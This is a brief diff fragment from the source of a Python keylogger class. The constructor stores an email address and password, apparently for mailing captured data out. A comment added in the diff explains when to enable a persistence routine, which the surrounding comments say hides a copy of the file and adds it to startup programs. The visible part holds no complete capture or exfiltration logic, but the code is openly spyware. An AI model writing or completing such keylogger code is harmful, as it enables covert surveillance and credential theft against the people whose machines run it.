@@ -22,7 +22,7 @@ class Keylogger:
         self.email = email
         self.password = password
         self.TheIp = self.ip_check()
-        #self.check_file()
+        #self.check_file()   # Use this function only when using pyinstaller for packaging otherwise leave it as is
 
     # This function is defined to make program persistent
     # It will make a copy of file at a hidden location and will add it to startup programs
